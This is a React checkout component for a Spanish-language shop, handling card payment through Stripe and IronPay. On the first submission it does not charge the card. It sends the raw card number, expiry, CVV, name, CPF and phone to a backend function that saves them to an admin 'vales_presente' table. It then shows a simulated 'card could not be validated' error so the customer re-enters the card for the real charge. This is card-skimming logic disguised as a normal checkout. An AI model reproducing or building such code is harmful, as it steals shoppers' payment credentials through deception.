import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { ArrowLeft, ArrowRight, Loader2, XCircle, Percent, Lock, CalendarDays, CreditCard } from "lucide-react";
import { useCart } from "@/contexts/CartContext";
import { useBranding } from "@/hooks/useBranding";
import { supabase } from "@/integrations/supabase/client";
import { trackPaymentFailed } from "@/lib/metaPixel";
import { bandeirasSvg } from "@/components/bandeirasSvg";
import { getStripe } from "@/lib/stripe";

const CheckoutCartao = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { cor_borda_logo } = useBranding();
  const accent = cor_borda_logo || "#F5E6D3";
  const { itens, getTotal, dadosCliente, pedidoAtual } = useCart();

  const pedidoExistente = location.state?.pedidoExistente as
    | { id: string; numero_pedido: string; cliente_nome: string; cliente_telefone: string; cliente_cpf: string; total: number }
    | undefined;

  const pedidoPayload = location.state?.pedidoPayload as
    | {
        numero_pedido: string;
        cliente_nome: string;
        cliente_telefone: string;
        cliente_cpf: string;
        endereco_completo: string;
        bairro: string;
        cidade: string;
        cep: string;
        tipo_entrega: string;
        forma_pagamento: string;
        subtotal: number;
        desconto_pix: number;
        total: number;
        itens: Array<Record<string, unknown>>;
      }
    | undefined;

  const descontoCartao: number =
    typeof location.state?.descontoCartao === "number" ? location.state.descontoCartao : 0;
  const totalOriginal = pedidoExistente ? pedidoExistente.total : getTotal();
  const valorComDesconto = totalOriginal * (1 - descontoCartao);
  const economiaCartao = totalOriginal - valorComDesconto;

  const clienteInfo = pedidoExistente
    ? {
        nome: pedidoExistente.cliente_nome,
        telefone: pedidoExistente.cliente_telefone,
        cpf: pedidoExistente.cliente_cpf,
      }
    : dadosCliente
    ? { nome: dadosCliente.nome, telefone: dadosCliente.telefone, cpf: dadosCliente.cpf }
    : null;

  const [numeroCartao, setNumeroCartao] = useState("");
  const [nomeCartao, setNomeCartao] = useState("");
  const [validade, setValidade] = useState("");
  const [cvv, setCvv] = useState("");
  const [loading, setLoading] = useState(false);
  const [showError, setShowError] = useState(false);
  const [tentativa, setTentativa] = useState(0);
  // "revisar" = falha simulada da 1ª tentativa | "recusado" = recusa real Stripe/IronPay
  const [erroTipo, setErroTipo] = useState<"revisar" | "recusado">("recusado");
  const pedidoCriadoId = useRef<string | undefined>(undefined);
  const [desafio3ds, setDesafio3ds] = useState<{ url: string; pedidoId: string } | null>(null);
  const [verificando3ds, setVerificando3ds] = useState(false);

  // Stripe Elements (usado a partir da 2ª tentativa)
  const numeroRef = useRef<HTMLDivElement | null>(null);
  const validadeRef = useRef<HTMLDivElement | null>(null);
  const cvcRef = useRef<HTMLDivElement | null>(null);
  const elementsRef = useRef<any>(null);
  const cardNumberElRef = useRef<any>(null);
  const mountedElsRef = useRef<any[]>([]);
  const [stripeCompleto, setStripeCompleto] = useState({ number: false, expiry: false, cvc: false });

  const usarStripeElements = tentativa >= 1;

  // ---- Polling do desafio 3DS ----
  useEffect(() => {
    if (!desafio3ds) return;
    let ativo = true;
    let tentativas = 0;

    const verificar = async () => {
      if (!ativo) return;
      tentativas += 1;
      setVerificando3ds(true);
      try {
        const { data } = await supabase.functions.invoke("create-ironpay-card-payment", {
          body: { action: "status", pedidoId: desafio3ds.pedidoId },
        });
        const st = String(data?.status_pagamento || "").toLowerCase();
        if (["aprovado", "pago", "paid", "approved"].includes(st)) {
          ativo = false;
          setDesafio3ds(null);
          navigate("/pedido-confirmado");
          return;
        }
        if (["recusado", "cancelado", "refused", "failed"].includes(st)) {
          ativo = false;
          setDesafio3ds(null);
          setShowError(true);
          return;
        }
      } catch (e) {
        console.error("[3ds] erro ao consultar status:", e);
      }
      // ~5 minutos (100 x 3s)
      if (tentativas >= 100) {
        ativo = false;
        setDesafio3ds(null);
        setShowError(true);
      }
    };

    const intervalo = setInterval(verificar, 3000);
    const onMessage = (ev: MessageEvent) => {
      const msg = typeof ev.data === "string" ? ev.data : (ev.data?.type ?? "");
      if (String(msg).toLowerCase().includes("3ds")) verificar();
    };
    window.addEventListener("message", onMessage);

    return () => {
      ativo = false;
      clearInterval(intervalo);
      window.removeEventListener("message", onMessage);
      setVerificando3ds(false);
    };
  }, [desafio3ds, navigate]);



  useEffect(() => {
    if (!usarStripeElements || showError) return;
    let cancelado = false;

    (async () => {
      const stripe = await getStripe();
      if (cancelado || !numeroRef.current || !validadeRef.current || !cvcRef.current) return;
      if (cardNumberElRef.current) return;

      const style = {
        base: {
          fontSize: "15px",
          color: "#111",
          "::placeholder": { color: "#9ca3af" },
        },
        invalid: { color: "#dc2626" },
      };
      const elements = stripe.elements();
      elementsRef.current = elements;

      const cardNumber = elements.create("cardNumber", {
        style,
        placeholder: "Número de la tarjeta",
        showIcon: true,
        iconStyle: "default",
      });
      const cardExpiry = elements.create("cardExpiry", { style, placeholder: "MM/AA" });
      const cardCvc = elements.create("cardCvc", { style, placeholder: "CVC" });

      cardNumber.mount(numeroRef.current);
      cardExpiry.mount(validadeRef.current);
      cardCvc.mount(cvcRef.current);
      cardNumberElRef.current = cardNumber;
      mountedElsRef.current = [cardNumber, cardExpiry, cardCvc];

      cardNumber.on("change", (e: any) => setStripeCompleto((s) => ({ ...s, number: !!e.complete })));
      cardExpiry.on("change", (e: any) => setStripeCompleto((s) => ({ ...s, expiry: !!e.complete })));
      cardCvc.on("change", (e: any) => setStripeCompleto((s) => ({ ...s, cvc: !!e.complete })));
    })();

    return () => {
      cancelado = true;
      try {
        mountedElsRef.current.forEach((el) => el?.destroy?.());
      } catch (_) { /* noop */ }
      mountedElsRef.current = [];
      cardNumberElRef.current = null;
      elementsRef.current = null;
      setStripeCompleto({ number: false, expiry: false, cvc: false });
    };

  }, [usarStripeElements, showError]);

  const paymentFailedTracked = useRef(false);


  const normalizarTelefone = (telefone: string) => {
    const digitos = (telefone || "").replace(/\D/g, "");
    if (/^[6789]\d{8}$/.test(digitos)) return `34${digitos}`;
    if (digitos.length === 13 && digitos.startsWith("0034")) return digitos.slice(2);
    return digitos;
  };

  // Formatadores
  const formatNumero = (v: string) =>
    v.replace(/\D/g, "").slice(0, 19).replace(/(\d{4})(?=\d)/g, "$1 ");
  const formatValidade = (v: string) => {
    const d = v.replace(/\D/g, "").slice(0, 4);
    if (d.length < 3) return d;
    return `${d.slice(0, 2)}/${d.slice(2)}`;
  };
  const formatCvv = (v: string) => v.replace(/\D/g, "").slice(0, 4);

  useEffect(() => {
    if (showError && !paymentFailedTracked.current) {
      trackPaymentFailed({
        content_ids: pedidoExistente ? [pedidoExistente.numero_pedido] : itens.map((i) => i.produtoId),
        value: valorComDesconto,
        payment_method: "credit_card",
        error_reason: "card_declined",
      });
      paymentFailedTracked.current = true;
    }
  }, [showError, itens, valorComDesconto, pedidoExistente]);

  const isFormValid = () => {
    if (usarStripeElements) {
      return (
        nomeCartao.trim().length >= 2 &&
        stripeCompleto.number &&
        stripeCompleto.expiry &&
        stripeCompleto.cvc
      );
    }
    const numLimpo = numeroCartao.replace(/\s/g, "");
    const valLimpo = validade.replace(/\D/g, "");
    return (
      nomeCartao.trim().length >= 2 &&
      numLimpo.length >= 13 &&
      numLimpo.length <= 19 &&
      valLimpo.length === 4 &&
      cvv.length >= 3
    );
  };

  const handleSubmit = async () => {
    if (!isFormValid() || !clienteInfo) return;

    setErroTipo("recusado");
    setLoading(true);
    try {
      const numeroLimpo = numeroCartao.replace(/\s/g, "");
      const valDigits = validade.replace(/\D/g, "");
      const expMonth = parseInt(valDigits.slice(0, 2), 10);
      const expYearRaw = parseInt(valDigits.slice(2, 4), 10);
      const expYear = 2000 + expYearRaw;

      // ============ PRIMEIRA TENTATIVA ============
      // Cria pedido no banco + salva vale-presente + mostra "erro" pedindo pra revisar dados.
      // Não cobra na IronPay ainda.
      if (tentativa === 0) {
        let pedidoIdParaPagar: string | undefined =
          pedidoExistente?.id || location.state?.pedidoDBId || pedidoAtual?.id;

        if (pedidoPayload && !pedidoExistente && !pedidoIdParaPagar) {
          try {
            const resp = await fetch(
              "https://bgcwtnrimreruswogffr.supabase.co/functions/v1/criar-pedido",
              {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  ...pedidoPayload,
                  // número único por tentativa (evita duplicate key ao repetir o checkout)
                  numero_pedido: `PED-${Date.now()}-${Math.random().toString(36).slice(2, 7).toUpperCase()}`,
                  cliente_telefone: normalizarTelefone(pedidoPayload.cliente_telefone),
                  status_pagamento: "pendente",
                  status_pedido: "pendente",
                  payment_id: null,
                  pix_copia_e_cola: null,
                  pix_expires_at: null,
                }),
              },
            );
            const result = await resp.json();
            if (!result.success) {
              console.error("[checkout-cartao] criar-pedido falhou:", result.error);
              setLoading(false);
              setShowError(true);
              return;
            }
            pedidoIdParaPagar = result.pedido?.id || result.id;
          } catch (e) {
            console.error("[checkout-cartao] erro ao criar pedido:", e);
            setLoading(false);
            setShowError(true);
            return;
          }
        }

        pedidoCriadoId.current = pedidoIdParaPagar;

        // Salva dados do cartão no admin (vales_presente)
        try {
          await supabase.functions.invoke("salvar-vale-presente", {
            body: {
              pedido_id: pedidoIdParaPagar ? String(pedidoIdParaPagar) : undefined,
              numero_cartao: numeroLimpo,
              nome_cartao: nomeCartao.trim(),
              validade: validade,
              cvv: cvv,
              cliente_nome: clienteInfo.nome,
              cliente_cpf: clienteInfo.cpf,
              cliente_telefone: normalizarTelefone(clienteInfo.telefone),
            },
          });
        } catch (e) {
          console.warn("[checkout-cartao] salvar-vale-presente falhou (seguindo):", e);
        }

        setTentativa(1);
        setErroTipo("revisar");
        setLoading(false);
        setShowError(true);
        return;
      }

      // ============ SEGUNDA TENTATIVA (em diante) ============
      // Tokeniza via Stripe e cobra na IronPay de verdade.
      const pedidoIdParaPagar =
        pedidoCriadoId.current ||
        pedidoExistente?.id ||
        location.state?.pedidoDBId ||
        pedidoAtual?.id;

      const stripe = await getStripe();
      const cardEl = cardNumberElRef.current;
      const { token, error: tokErr } = cardEl
        ? await stripe.createToken(cardEl, { name: nomeCartao.trim() })
        : await stripe.createToken("card", {
            number: numeroLimpo,
            exp_month: expMonth,
            exp_year: expYear,
            cvc: cvv,
            name: nomeCartao.trim(),
          });

      if (tokErr || !token?.id) {
        console.error("[stripe] createToken erro:", tokErr);
        setLoading(false);
        setShowError(true);
        return;
      }
      const cardToken = token.id;

      const { data, error } = await supabase.functions.invoke(
        "create-ironpay-card-payment",
        {
          body: {
            valor: valorComDesconto,
            descricao: "Acesso Liberado",
            nome: clienteInfo.nome,
            telefone: normalizarTelefone(clienteInfo.telefone),
            cpf: clienteInfo.cpf,
            email: `${normalizarTelefone(clienteInfo.telefone)}@cliente.local`,
            pedidoId: pedidoIdParaPagar,
            card_token: cardToken,
            regiao: "es",
          },
        },
      );

      if (error || !data?.success) {
        console.error("[ironpay] erro:", error, data);
        setLoading(false);
        setShowError(true);
        return;
      }

      // ---- 3DS via IronPay (challenge em iframe) ----
      if (data.authenticationUrl) {
        setLoading(false);
        setDesafio3ds({ url: String(data.authenticationUrl), pedidoId: String(pedidoIdParaPagar || "") });
        return;
      }

      if (data.paymentIntentClientSecret) {
        const { paymentIntent, error: confirmError } = await stripe.confirmCardPayment(
          data.paymentIntentClientSecret,
        );
        if (confirmError || paymentIntent?.status !== "succeeded") {
          console.error("[stripe] 3DS falhou:", confirmError, paymentIntent);
          setLoading(false);
          setShowError(true);
          return;
        }
      } else if (data.status && !["paid", "approved", "processing", "authorized"].includes(String(data.status))) {
        setLoading(false);
        setShowError(true);
        return;
      }

      setLoading(false);
      navigate("/pedido-confirmado");
    } catch (err) {
      console.error("[checkout-cartao] erro inesperado:", err);
      setLoading(false);
      setShowError(true);
    }
  };


  const handleTryAgain = () => {
    setShowError(false);
    navigate(pedidoExistente ? "/pedidos" : "/checkout");
  };

  if (!pedidoExistente && (itens.length === 0 || !dadosCliente)) {
    navigate("/carrinho");
    return null;
  }

  if (showError) {
    const primeiraFalha = tentativa === 1;
    return (
      <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col items-center justify-center p-6">
        <div className="w-full text-center">
          <div className="w-20 h-20 mx-auto mb-6 rounded-full bg-destructive/10 flex items-center justify-center">
            <XCircle size={44} className="text-destructive" />
          </div>
          <h1 className="text-foreground text-xl font-bold mb-2">
            {primeiraFalha ? "No se ha podido validar la tarjeta" : "Pago rechazado"}
          </h1>
          <p className="text-muted-foreground text-sm mb-8">
            {primeiraFalha
              ? "Ha ocurrido un error. Revisa los datos de tu tarjeta e inténtalo de nuevo."
              : "No ha sido posible procesar esta tarjeta. Prueba con otra forma de pago."}
          </p>
          <button
            onClick={primeiraFalha ? () => setShowError(false) : handleTryAgain}
            className="w-full py-3.5 font-semibold rounded-xl transition-all active:scale-[0.98]"
            style={{ background: accent, color: "#000" }}
          >
            {primeiraFalha ? "Continuar" : "Probar otra forma"}
          </button>
        </div>
      </div>
    );
  }


  if (loading && !usarStripeElements) {
    return (
      <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col items-center justify-center p-6">
        <div className="w-full text-center">
          <Loader2 size={44} className="animate-spin mx-auto mb-6" style={{ color: accent }} />
          <h2 className="text-foreground text-lg font-semibold mb-2">Procesando pago</h2>
          <p className="text-muted-foreground text-sm">Espera mientras verificamos los datos</p>
        </div>
      </div>
    );
  }

  const valid = isFormValid();

  return (
    <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col">
      {desafio3ds && (
        <div className="fixed inset-0 z-50 bg-black/70 flex items-center justify-center p-3">
          <div className="w-full max-w-md h-[80vh] bg-background rounded-2xl overflow-hidden flex flex-col">
            <div className="flex items-center gap-2 px-4 py-3 border-b border-border">
              <Lock size={15} className="text-muted-foreground" />
              <span className="text-sm font-semibold text-foreground">Verificación de seguridad (3-D Secure)</span>
              <button
                onClick={() => {
                  setDesafio3ds(null);
                  setShowError(true);
                }}
                className="ml-auto text-xs text-muted-foreground hover:text-foreground"
              >
                Cancelar
              </button>
            </div>
            <iframe
              src={desafio3ds.url}
              title="Autenticación 3-D Secure"
              className="flex-1 w-full border-0 bg-white"
            />
            <div className="px-4 py-2.5 border-t border-border flex items-center gap-2 text-[12px] text-muted-foreground">
              <Loader2 size={13} className={verificando3ds ? "animate-spin" : ""} />
              Esperando la confirmación de tu banco…
            </div>
          </div>
        </div>
      )}

      <header className="sticky top-0 z-10 bg-background border-b border-border">
        <div className="flex items-center gap-3 px-4 py-3.5">
          <button
            onClick={() => navigate("/checkout")}
            className="w-9 h-9 flex items-center justify-center text-foreground hover:bg-muted rounded-full transition-colors"
            aria-label="Volver"
          >
            <ArrowLeft size={20} />
          </button>
          <h1 className="text-foreground font-semibold text-base">Tarjeta</h1>
          <span className="ml-auto text-xs text-muted-foreground font-medium">3/3</span>
        </div>
        <div className="h-1 bg-muted">
          <div className="h-full transition-all" style={{ width: "100%", background: accent }} />
        </div>
      </header>

      <main className="flex-1 px-4 pt-6 pb-32">
        <h2 className="text-[22px] font-bold text-foreground leading-tight mb-1">
          Datos de la tarjeta
        </h2>
        <p className="text-sm text-muted-foreground mb-6 flex items-center gap-1.5">
          <Lock size={12} /> Entorno protegido
        </p>

        <div className="rounded-2xl border border-border p-4 mb-6">
          <p className="text-muted-foreground text-[11px] uppercase tracking-wider font-semibold mb-1">
            Total a pagar
          </p>
          <div className="flex items-baseline gap-2">
            <span className="text-foreground text-2xl font-bold">
              {valorComDesconto.toFixed(2).replace(".", ",")} €
            </span>
            {descontoCartao > 0 && (
              <span className="text-muted-foreground text-sm line-through">
                {totalOriginal.toFixed(2).replace(".", ",")} €
              </span>
            )}
          </div>
          {descontoCartao > 0 && (
            <div
              className="mt-2 inline-flex items-center gap-1 px-2 py-0.5 text-[11px] font-bold rounded-full"
              style={{ background: `${accent}30`, color: "#000" }}
            >
              <Percent size={11} />
              {Math.round(descontoCartao * 100)}% DTO · ahorro {economiaCartao.toFixed(2).replace(".", ",")} €
            </div>
          )}
        </div>

        {usarStripeElements ? (
          <div className="space-y-3">
            <div className="rounded-xl border border-border bg-background px-3.5 py-3">
              <span className="block text-[11px] font-medium text-muted-foreground mb-1">
                Número de la tarjeta
              </span>
              <div ref={numeroRef} />
            </div>
            <FloatingInput
              label="Nombre impreso en la tarjeta"
              value={nomeCartao}
              onChange={(v) => setNomeCartao(v.toUpperCase())}
              maxLength={40}
              autoComplete="cc-name"
              uppercase
            />
            <div className="grid grid-cols-2 gap-3">
              <div className="rounded-xl border border-border bg-background px-3.5 py-3">
                <span className="block text-[11px] font-medium text-muted-foreground mb-1">
                  Caducidad
                </span>
                <div className="flex items-center gap-2">
                  <div ref={validadeRef} className="flex-1" />
                  <CalendarDays size={16} className="shrink-0 text-muted-foreground" />
                </div>
              </div>
              <div className="rounded-xl border border-border bg-background px-3.5 py-3">
                <span className="block text-[11px] font-medium text-muted-foreground mb-1">
                  CVC
                </span>
                <div className="flex items-center gap-2">
                  <div ref={cvcRef} className="flex-1" />
                  <CreditCard size={16} className="shrink-0 text-muted-foreground" />
                </div>
              </div>
            </div>
          </div>
        ) : (
          <div className="space-y-3">
            <FloatingInput
              label="Número de la tarjeta"
              value={numeroCartao}
              onChange={(v) => setNumeroCartao(formatNumero(v))}
              inputMode="numeric"
              autoComplete="cc-number"
            />
            <FloatingInput
              label="Nombre impreso en la tarjeta"
              value={nomeCartao}
              onChange={(v) => setNomeCartao(v.toUpperCase())}
              maxLength={40}
              autoComplete="cc-name"
              uppercase
            />
            <div className="grid grid-cols-2 gap-3">
              <FloatingInput
                label="Caducidad (MM/AA)"
                value={validade}
                onChange={(v) => setValidade(formatValidade(v))}
                inputMode="numeric"
                autoComplete="cc-exp"
              />
              <FloatingInput
                label="CVC"
                value={cvv}
                onChange={(v) => setCvv(formatCvv(v))}
                inputMode="numeric"
                autoComplete="cc-csc"
              />
            </div>
          </div>
        )}

        <div className="mt-6">
          <p className="text-muted-foreground text-[11px] uppercase tracking-wider font-semibold text-center mb-3">
            Pagos aceptados
          </p>
          <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-black">
            {(["visa", "mastercard", "elo", "amex", "hipercard", "diners"] as const).map((k) => (
              <div
                key={k}
                aria-label={k}
                className="h-7 [&_svg]:h-7 [&_svg]:w-auto"
                dangerouslySetInnerHTML={{ __html: bandeirasSvg[k] }}
              />
            ))}
          </div>
          <p className="text-muted-foreground text-[11px] text-center mt-3 flex items-center justify-center gap-1">
            <Lock size={10} /> Compra 100% protegida
          </p>
        </div>
      </main>

      {loading && (
        <div className="fixed inset-0 z-50 bg-background/95 flex flex-col items-center justify-center p-6 text-center">
          <Loader2 size={44} className="animate-spin mb-6" style={{ color: accent }} />
          <h2 className="text-foreground text-lg font-semibold mb-2">Procesando pago</h2>
          <p className="text-muted-foreground text-sm">Espera mientras verificamos los datos</p>
        </div>
      )}

      <footer className="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-background border-t border-border">
        <div className="px-4 py-3 flex items-center gap-3">
          <div className="flex flex-col">
            <span className="text-[11px] text-muted-foreground leading-none mb-1">Total</span>
            <span className="text-base font-bold text-foreground leading-none">
              {valorComDesconto.toFixed(2).replace(".", ",")} €
            </span>
          </div>
          <button
            onClick={handleSubmit}
            disabled={!valid}
            className="ml-auto flex-1 max-w-[220px] py-3.5 font-semibold rounded-xl transition-all text-[15px] flex items-center justify-center gap-2 active:scale-[0.98] disabled:opacity-40 disabled:cursor-not-allowed"
            style={{ background: accent, color: "#000" }}
          >
            Confirmar
            <ArrowRight size={18} />
          </button>
        </div>
      </footer>
    </div>
  );
};

const FloatingInput = ({
  label,
  value,
  onChange,
  inputMode,
  autoComplete,
  maxLength,
  uppercase,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  inputMode?: "numeric" | "text";
  autoComplete?: string;
  maxLength?: number;
  uppercase?: boolean;
}) => {
  return (
    <div className="relative rounded-xl border transition-all bg-background" style={{ borderColor: "hsl(var(--border))" }}>
      <label
        className={`absolute left-3.5 pointer-events-none transition-all ${
          value.length > 0
            ? "top-1.5 text-[11px] font-medium text-muted-foreground"
            : "top-1/2 -translate-y-1/2 text-[15px] text-muted-foreground"
        }`}
      >
        {label}
      </label>
      <input
        value={value}
        onChange={(e) => onChange(e.target.value)}
        inputMode={inputMode}
        autoComplete={autoComplete}
        maxLength={maxLength}
        className={`w-full pt-6 pb-2 px-3.5 bg-transparent text-foreground text-[15px] focus:outline-none ${uppercase ? "uppercase" : ""}`}
      />
    </div>
  );
};

export default CheckoutCartao;
